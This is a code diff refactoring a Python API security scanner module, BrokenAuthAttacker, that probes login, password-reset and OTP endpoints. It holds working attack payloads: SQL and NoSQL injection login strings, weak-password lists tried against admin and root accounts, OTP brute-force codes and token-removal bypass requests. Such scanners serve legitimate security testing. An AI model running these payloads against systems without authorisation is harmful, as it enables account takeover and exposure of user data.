@@ -8,40 +8,31 @@ Tests API endpoints for authentication vulnerabilities by:
 - Analyzing token handling
 """
 
-import time
 import json
-import re
-import base64
-import hashlib
-from typing import Any, Optional
+import time
 from dataclasses import dataclass
+
 import requests
 
-from ..models import (
-    AttackType,
-    AttackResult,
-    Endpoint,
-    Severity,
-    Vulnerability
-)
+from ..models import AttackResult, AttackType, Endpoint, Severity, Vulnerability
 
 
 @dataclass
 class AuthContext:
     """Context for authentication testing."""
-    user_email: Optional[str] = None
-    user_phone: Optional[str] = None
-    user_id: Optional[str] = None
-    valid_token: Optional[str] = None
+    user_email: str | None = None
+    user_phone: str | None = None
+    user_id: str | None = None
+    valid_token: str | None = None
 
 
 class BrokenAuthAttacker:
     """Detects broken authentication vulnerabilities in API endpoints.
-    
+
     Covers OWASP API5:2023 - Broken Function Level Authorization and
     API7:2023 - Server Side Request Forgery related auth issues.
     """
-    
+
     # Common password reset endpoints
     RESET_ENDPOINTS = [
         '/identity/api/auth/forget-password',
@@ -52,7 +43,7 @@ class BrokenAuthAttacker:
         '/auth/recover',
         '/auth/password/forgot',
     ]
-    
+
     # OTP verification endpoints
     OTP_ENDPOINTS = [
         '/identity/api/auth/v3/check-otp',
@@ -61,7 +52,7 @@ class BrokenAuthAttacker:
         '/api/otp/verify',
         '/auth/verify',
     ]
-    
+
     # Login endpoints
     LOGIN_ENDPOINTS = [
         '/identity/api/auth/login',
@@ -70,14 +61,14 @@ class BrokenAuthAttacker:
         '/api/v1/login',
         '/user/login',
     ]
-    
+
     # Common weak passwords
     WEAK_PASSWORDS = [
         'password', 'Password1!', '123456', 'qwerty',
         'admin', 'letmein', 'welcome', 'monkey',
         'password123', 'admin123', 'root', 'toor'
     ]
-    
+
     # OTP brute force payloads
     OTP_PAYLOADS = [
         {'otp': '000000'},
@@ -90,7 +81,7 @@ class BrokenAuthAttacker:
         {'code': '000000'},
         {'code': '123456'},
     ]
-    
+
     # Token manipulation patterns
     TOKEN_MANIPULATIONS = [
         # Remove token
@@ -106,10 +97,10 @@ class BrokenAuthAttacker:
         # Expired token
         {'expired': True},
     ]
-    
+
     def __init__(self, target_url: str, timeout: int = 10):
         """Initialize the Broken Authentication detector.
-        
+
         Args:
             target_url: Base URL of the target API
             timeout: Request timeout in seconds
@@ -123,66 +114,65 @@ class BrokenAuthAttacker:
             'Content-Type': 'application/json'
         })
         self.auth_context = AuthContext()
-    
+
     def set_context(self, context: AuthContext):
         """Set authentication context for testing.
-        
+
         Args:
             context: Authentication context with user info
         """
         self.auth_context = context
-    
+
     def attack(
         self,
         endpoint: Endpoint,
-        auth_token: Optional[str] = None,
-        parameters_to_test: Optional[list[str]] = None
+        auth_token: str | None = None,
+        parameters_to_test: list[str] | None = None
     ) -> list[AttackResult]:
         """Perform broken authentication attacks on an endpoint.
-        
+
         Args:
             endpoint: The endpoint to attack
             auth_token: Authentication token
             parameters_to_test: Specific parameters to test
-            
+
         Returns:
             List of attack results
         """
         # Handle API misuse
         if auth_token is not None and isinstance(auth_token, list):
-            parameters_to_test = auth_token
             auth_token = None
-        
+
         results: list[AttackResult] = []
-        
+
         if auth_token:
             self.session.headers['Authorization'] = f"Bearer {auth_token}"
-        
+
         path_lower = endpoint.path.lower()
-        
+
         # 1. Test password reset flow
         if 'forget' in path_lower or 'reset' in path_lower or 'forgot' in path_lower:
             results.extend(self._test_password_reset(endpoint))
-        
+
         # 2. Test OTP verification
         if 'otp' in path_lower or 'verify' in path_lower:
             results.extend(self._test_otp_bypass(endpoint))
-        
+
         # 3. Test login endpoint
         if 'login' in path_lower or 'signin' in path_lower:
             results.extend(self._test_login_weaknesses(endpoint))
-        
+
         # 4. Test token handling
         if 'token' in path_lower or 'session' in path_lower:
             results.extend(self._test_token_handling(endpoint, auth_token))
-        
+
         # 5. Test authentication bypass on protected endpoints
         if endpoint.requires_auth:
             results.extend(self._test_auth_bypass(endpoint, auth_token))
-        
+
         # 6. Discover and test auth endpoints
         results.extend(self._discover_auth_endpoints(endpoint))
-        
+
         return results
 
     def _is_sensitive_data(self, response_text: str) -> bool:
@@ -193,7 +183,7 @@ class BrokenAuthAttacker:
             for field in ["email", "username", "account", "user", "token"]
         )
 
-    def _extract_evidence_excerpt(self, response_text: str) -> Optional[str]:
+    def _extract_evidence_excerpt(self, response_text: str) -> str | None:
         """Extract a focused evidence snippet around sensitive fields."""
         response_lower = response_text.lower()
         for field in ["email", "username", "account", "user", "token"]:
@@ -218,9 +208,9 @@ class BrokenAuthAttacker:
         endpoint: Endpoint,
         payload: str,
         url: str,
-        response: Optional[requests.Response] = None,
-        error_message: Optional[str] = None,
-        duration_ms: Optional[float] = None,
+        response: requests.Response | None = None,
+        error_message: str | None = None,
+        duration_ms: float | None = None,
         success: bool = False,
     ) -> AttackResult:
         """Create a broken-auth result with minimal proof fields."""
@@ -242,39 +232,39 @@ class BrokenAuthAttacker:
             duration_ms=duration_ms,
             error_message=error_message,
         )
-    
+
     def _test_password_reset(self, endpoint: Endpoint) -> list[AttackResult]:
         """Test password reset vulnerabilities."""
         results = []
-        
+
         # Test 1: Missing email validation
         result = self._test_reset_without_email(endpoint)
         if result:
             results.append(result)
-        
+
         # Test 2: Email enumeration
         result = self._test_email_enumeration(endpoint)
         if result:
             results.append(result)
-        
+
         # Test 3: Reset token leakage
         result = self._test_token_leakage(endpoint)
         if result:
             results.append(result)
-        
+
         # Test 4: Reset for another user
         result = self._test_reset_other_user(endpoint)
         if result:
             results.append(result)
-        
+
         return results
-    
-    def _test_reset_without_email(self, endpoint: Endpoint) -> Optional[AttackResult]:
+
+    def _test_reset_without_email(self, endpoint: Endpoint) -> AttackResult | None:
         """Test password reset without providing email."""
         try:
             url = f"{self.target_url}{endpoint.path}"
             start_time = time.time()
-            
+
             # Test with empty body
             response = self.session.request(
                 endpoint.method.value,
@@ -282,12 +272,12 @@ class BrokenAuthAttacker:
                 json={},
                 timeout=self.timeout
             )
-            
+
             duration_ms = (time.time() - start_time) * 1000
-            
+
             # Check if reset succeeded without email
             is_vulnerable = response.status_code in [200, 201, 202]
-            
+
             if is_vulnerable:
                 return AttackResult(
                     endpoint=endpoint,
@@ -299,24 +289,24 @@ class BrokenAuthAttacker:
                     duration_ms=duration_ms,
                     error_message="Password reset accepted without email"
                 )
-            
-        except Exception as e:
+
+        except Exception:
             pass
-        
+
         return None
-    
+
     def _test_email_enumeration(
-        self, 
+        self,
         endpoint: Endpoint
-    ) -> Optional[AttackResult]:
+    ) -> AttackResult | None:
         """Test for email enumeration via timing or response differences."""
         try:
             url = f"{self.target_url}{endpoint.path}"
-            
+
             # Test with valid email
             valid_email = self.auth_context.user_email or 'valid@test.com'
             invalid_email = 'nonexistent_user_xyz@test.com'
-            
+
             # Request with invalid email
             start_time = time.time()
             response_invalid = self.session.request(
@@ -326,7 +316,7 @@ class BrokenAuthAttacker:
                 timeout=self.timeout
             )
             invalid_duration = (time.time() - start_time) * 1000
-            
+
             # Request with valid email
             start_time = time.time()
             response_valid = self.session.request(
@@ -336,10 +326,10 @@ class BrokenAuthAttacker:
                 timeout=self.timeout
             )
             valid_duration = (time.time() - start_time) * 1000
-            
+
             # Check for timing difference (more than 200ms difference)
             timing_diff = abs(valid_duration - invalid_duration)
-            
+
             if timing_diff > 200:
                 return AttackResult(
                     endpoint=endpoint,
@@ -351,7 +341,7 @@ class BrokenAuthAttacker:
                     duration_ms=valid_duration,
                     error_message="Email enumeration via timing attack"
                 )
-            
+
             # Check for response difference
             if response_valid.text != response_invalid.text:
                 if len(response_valid.text) > len(response_invalid.text) + 50:
@@ -365,18 +355,18 @@ class BrokenAuthAttacker:
                         duration_ms=valid_duration,
                         error_message="Email enumeration via response difference"
                     )
-            
+
         except Exception:
             pass
-        
+
         return None
-    
-    def _test_token_leakage(self, endpoint: Endpoint) -> Optional[AttackResult]:
+
+    def _test_token_leakage(self, endpoint: Endpoint) -> AttackResult | None:
         """Test for reset token leakage in responses."""
         try:
             url = f"{self.target_url}{endpoint.path}"
             email = self.auth_context.user_email or 'test@test.com'
-            
+
             start_time = time.time()
             response = self.session.request(
                 endpoint.method.value,
@@ -385,11 +375,11 @@ class BrokenAuthAttacker:
                 timeout=self.timeout
             )
             duration_ms = (time.time() - start_time) * 1000
-            
+
             # Check if token is exposed in response
             response_str = response.text.lower()
             token_patterns = ['token', 'reset_token', 'code', 'otp', 'key']
-            
+
             for pattern in token_patterns:
                 if pattern in response_str:
                     try:
@@ -407,22 +397,22 @@ class BrokenAuthAttacker:
                                         duration_ms=duration_ms,
                                         error_message=f"Reset token leaked in response: {key}"
                                     )
-                    except:
+                    except Exception:
                         pass
-            
+
         except Exception:
             pass
-        
+
         return None
-    
-    def _test_reset_other_user(self, endpoint: Endpoint) -> Optional[AttackResult]:
+
+    def _test_reset_other_user(self, endpoint: Endpoint) -> AttackResult | None:
         """Test resetting password for another user."""
         try:
             url = f"{self.target_url}{endpoint.path}"
-            
+
             # Try to reset with another user's email and our token
             other_emails = ['admin@test.com', 'administrator@test.com', 'root@test.com']
-            
+
             for email in other_emails:
                 start_time = time.time()
                 response = self.session.request(
@@ -432,7 +422,7 @@ class BrokenAuthAttacker:
                     timeout=self.timeout
                 )
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
@@ -447,27 +437,27 @@ class BrokenAuthAttacker:
                                 duration_ms=duration_ms,
                                 error_message=f"Password reset initiated for: {email}"
                             )
-                    except:
+                    except Exception:
                         pass
-            
+
         except Exception:
             pass
-        
+
         return None
-    
+
     def _test_otp_bypass(self, endpoint: Endpoint) -> list[AttackResult]:
         """Test OTP verification bypass."""
         results = []
-        
+
         for payload in self.OTP_PAYLOADS:
             try:
                 url = f"{self.target_url}{endpoint.path}"
-                
+
                 # Add required parameters
                 body = dict(payload)
                 if self.auth_context.user_email:
                     body['email'] = self.auth_context.user_email
-                
+
                 start_time = time.time()
                 response = self.session.request(
                     endpoint.method.value,
@@ -476,7 +466,7 @@ class BrokenAuthAttacker:
                     timeout=self.timeout
                 )
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 # Check for successful bypass
                 if response.status_code == 200:
                     try:
@@ -493,48 +483,48 @@ class BrokenAuthAttacker:
                                 duration_ms=duration_ms,
                                 error_message=f"OTP bypassed with: {payload}"
                             ))
-                    except:
+                    except Exception:
                         pass
-                
+
             except Exception:
                 pass
-        
+
         return results
-    
+
     def _test_login_weaknesses(self, endpoint: Endpoint) -> list[AttackResult]:
         """Test login endpoint for weaknesses."""
         results = []
-        
+
         # Test weak passwords
         for password in self.WEAK_PASSWORDS[:5]:
             result = self._test_weak_password(endpoint, password)
             if result:
                 results.append(result)
-        
+
         # Test SQL injection in login
         result = self._test_login_injection(endpoint)
         if result:
             results.append(result)
-        
+
         # Test NoSQL injection in login
         result = self._test_login_nosql(endpoint)
         if result:
             results.append(result)
-        
+
         return results
-    
+
     def _test_weak_password(
-        self, 
-        endpoint: Endpoint, 
+        self,
+        endpoint: Endpoint,
         password: str
-    ) -> Optional[AttackResult]:
+    ) -> AttackResult | None:
         """Test for weak password acceptance."""
         try:
             url = f"{self.target_url}{endpoint.path}"
-            
+
             # Test with common usernames
             usernames = ['admin', 'administrator', 'root', 'test', 'user']
-            
+
             for username in usernames:
                 start_time = time.time()
                 response = self.session.request(
@@ -544,7 +534,7 @@ class BrokenAuthAttacker:
                     timeout=self.timeout
                 )
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
@@ -559,15 +549,15 @@ class BrokenAuthAttacker:
                                 duration_ms=duration_ms,
                                 error_message=f"Weak password accepted: {username}"
                             )
-                    except:
+                    except Exception:
                         pass
-            
+
         except Exception:
             pass
-        
+
         return None
-    
-    def _test_login_injection(self, endpoint: Endpoint) -> Optional[AttackResult]:
+
+    def _test_login_injection(self, endpoint: Endpoint) -> AttackResult | None:
         """Test SQL injection in login."""
         sql_payloads = [
             "' OR '1'='1",
@@ -575,11 +565,11 @@ class BrokenAuthAttacker:
             "' OR 1=1--",
             "admin'/*",
         ]
-        
+
         for payload in sql_payloads:
             try:
                 url = f"{self.target_url}{endpoint.path}"
-                
+
                 start_time = time.time()
                 response = self.session.request(
                     endpoint.method.value,
@@ -588,7 +578,7 @@ class BrokenAuthAttacker:
                     timeout=self.timeout
                 )
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
@@ -603,26 +593,26 @@ class BrokenAuthAttacker:
                                 duration_ms=duration_ms,
                                 error_message=f"SQL injection in login: {payload}"
                             )
-                    except:
+                    except Exception:
                         pass
-                        
+
             except Exception:
                 pass
-        
+
         return None
-    
-    def _test_login_nosql(self, endpoint: Endpoint) -> Optional[AttackResult]:
+
+    def _test_login_nosql(self, endpoint: Endpoint) -> AttackResult | None:
         """Test NoSQL injection in login."""
         nosql_payloads = [
             {'username': {'$ne': ''}, 'password': {'$ne': ''}},
             {'username': 'admin', 'password': {'$gt': ''}},
             {'username': {'$regex': '.*'}, 'password': {'$regex': '.*'}},
         ]
-        
+
         for payload in nosql_payloads:
             try:
                 url = f"{self.target_url}{endpoint.path}"
-                
+
                 start_time = time.time()
                 response = self.session.request(
                     endpoint.method.value,
@@ -631,7 +621,7 @@ class BrokenAuthAttacker:
                     timeout=self.timeout
                 )
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code == 200:
                     try:
                         data = response.json()
@@ -644,33 +634,33 @@ class BrokenAuthAttacker:
                                 response_status=response.status_code,
                                 response_body=response.text[:500],
                                 duration_ms=duration_ms,
-                                error_message=f"NoSQL injection in login"
+                                error_message="NoSQL injection in login"
                             )
-                    except:
+                    except Exception:
                         pass
-                        
+
             except Exception:
                 pass
-        
+
         return None
-    
+
     def _test_token_handling(
-        self, 
+        self,
         endpoint: Endpoint,
-        auth_token: Optional[str]
+        auth_token: str | None
     ) -> list[AttackResult]:
         """Test token handling vulnerabilities."""
         results = []
-        
+
         if not auth_token:
             return results
-        
+
         # Test without token
         try:
             url = f"{self.target_url}{endpoint.path}"
             headers = dict(self.session.headers)
             headers.pop('Authorization', None)
-            
+
             start_time = time.time()
             response = self.session.request(
                 endpoint.method.value,
@@ -679,7 +669,7 @@ class BrokenAuthAttacker:
                 timeout=self.timeout
             )
             duration_ms = (time.time() - start_time) * 1000
-            
+
             if response.status_code == 200:
                 results.append(AttackResult(
                     endpoint=endpoint,
@@ -693,13 +683,13 @@ class BrokenAuthAttacker:
                 ))
         except Exception:
             pass
-        
+
         return results
-    
+
     def _test_auth_bypass(
-        self, 
+        self,
         endpoint: Endpoint,
-        auth_token: Optional[str]
+        auth_token: str | None
     ) -> list[AttackResult]:
         """Test authentication bypass on protected endpoints."""
         results = []
@@ -711,7 +701,7 @@ class BrokenAuthAttacker:
             if key != 'Authorization'
         }
 
-        baseline_response: Optional[requests.Response] = None
+        baseline_response: requests.Response | None = None
         if auth_token:
             try:
                 baseline_response = self.session.request(
@@ -781,27 +771,27 @@ class BrokenAuthAttacker:
                 )
 
         return results
-    
+
     def _discover_auth_endpoints(self, endpoint: Endpoint) -> list[AttackResult]:
         """Discover and test authentication-related endpoints."""
         results = []
-        
+
         # Test common auth endpoints
         all_auth_endpoints = (
-            self.RESET_ENDPOINTS + 
-            self.OTP_ENDPOINTS + 
+            self.RESET_ENDPOINTS +
+            self.OTP_ENDPOINTS +
             self.LOGIN_ENDPOINTS
         )
-        
+
         for path in all_auth_endpoints:
             try:
                 url = f"{self.target_url}{path}"
-                
+
                 # Test GET
                 start_time = time.time()
                 response = self.session.get(url, timeout=self.timeout)
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code not in [404, 405]:
                     results.append(AttackResult(
                         endpoint=Endpoint(
@@ -817,12 +807,12 @@ class BrokenAuthAttacker:
                         duration_ms=duration_ms,
                         error_message=f"Discovered endpoint: {path}"
                     ))
-                
+
                 # Test POST
                 start_time = time.time()
                 response = self.session.post(url, json={}, timeout=self.timeout)
                 duration_ms = (time.time() - start_time) * 1000
-                
+
                 if response.status_code not in [404, 405]:
                     results.append(AttackResult(
                         endpoint=Endpoint(
@@ -838,12 +828,12 @@ class BrokenAuthAttacker:
                         duration_ms=duration_ms,
                         error_message=f"Discovered POST endpoint: {path}"
                     ))
-                    
+
             except Exception:
                 pass
-        
+
         return results
-    
+
     def create_vulnerability(
         self,
         result: AttackResult,
